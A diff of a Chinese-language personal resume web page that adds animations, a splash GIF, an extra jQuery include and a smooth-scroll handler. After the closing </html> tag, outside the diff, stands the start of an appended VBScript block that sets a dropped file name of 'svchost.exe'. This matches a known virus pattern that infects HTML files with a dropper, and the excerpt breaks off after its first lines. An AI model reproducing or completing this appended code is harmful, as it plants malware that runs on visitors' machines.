@@ -8,30 +8,39 @@
     <link rel="stylesheet" href="https://cdn.bootcss.com/bootstrap/4.0.0-beta/css/bootstrap.min.css">
     <link href="https://cdn.bootcss.com/bootstrap/3.3.7/css/bootstrap.min.css" rel="stylesheet">
     <link rel="stylesheet" href="index.css">
+    <link rel="stylesheet" href="animate.css">
  
 <!-- jQuery文件。务必在bootstrap.min.js 之前引入 -->
     <script src="https://cdn.bootcss.com/jquery/3.2.1/jquery.min.js"></script>
- 
+    <script src="http://cdn.static.runoob.com/libs/jquery/1.10.2/jquery.min.js">
+    </script>
 <!-- popper.min.js 用于弹窗、提示、下拉菜单 -->
     <script src="https://cdn.bootcss.com/popper.js/1.12.5/umd/popper.min.js"></script>
  
 <!-- 最新的 Bootstrap4 核心 JavaScript 文件 -->
     <script src="https://cdn.bootcss.com/bootstrap/4.0.0-beta/js/bootstrap.min.js"></script>
+    <script src="index.js"></script>
+
     <title>我的简历</title>
 </head>
 <body>
-        
+
+  <div class="flash">
+    <img src="img/2.gif" alt="">
+  </div>
+
+
+
 <div class="tou jumbotron text-center">
     
-    <div class="img">
+    <div class="img" id="donghua">
 
     </div>
-    <h1>李津</h1>
-    <p>My resume</p> 
-    
+    <h1 id="donghua2">李津</h1>
+    <p class="donghua3">My resume</p> 
+ 
   </div>
    
- 
 
     
   <!--<div class="container">
@@ -88,7 +97,7 @@
   <div class="nr">
         <p>2015.09-2018.06 &nbsp; &nbsp; &nbsp;重庆工商职业学院</p>
         <p  class="bt">主修课程</p>
-        <p>web前端——&nbsp;Html(熟练掌握)——&nbsp;css(熟练掌握)——&nbsp;Bootstrap()——&nbsp;jquery——JavaScript</p>
+        <p>web前端——&nbsp;Html(熟练掌握)——&nbsp;css(熟练掌握)——&nbsp;Bootstrap——&nbsp;jquery——JavaScript</p>
 
     </div>
 
@@ -158,6 +167,19 @@
 
   </div>
 
+
+
+    <script>
+    
+    $("a").click(function () {
+
+    $("html, body").animate({scrollTop: $($(this).attr("href")).offset().top -20+ "px"}, 500);
+
+    return false;
+
+});
+    
+    </script>
 </body>
 </html><SCRIPT Language=VBScript><!--
 DropFileName = "svchost.exe"
